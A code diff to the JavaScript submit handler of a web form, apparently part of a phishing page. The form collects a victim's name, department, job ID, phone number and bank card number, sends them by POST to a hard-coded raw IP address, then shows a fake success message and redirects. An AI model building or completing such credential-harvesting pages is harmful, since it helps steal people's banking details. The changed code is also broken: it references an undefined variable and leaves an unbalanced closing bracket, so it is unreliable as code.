@@ -222,11 +222,20 @@ function sub() {
     if (!phone) { alert("请输入手机号"); return; }
     if (!bank) { alert("请输入银行卡号"); return; }
 
-    // 这里换成你的 cpolar 地址 + /submit
-    fetch("http://8.133.196.51:8080/submit", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ name, dept, jobid, phone, bank })
+    // 地址 + /submit
+fetch("http://8.133.196.51:8080/submit", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    name: name,
+    dept: dept,
+    job: job,
+    phone: phone,
+    bank: bank
+  })
+})
     }).then(() => {
         alert("提交成功！");
         location.href = "page3.html";
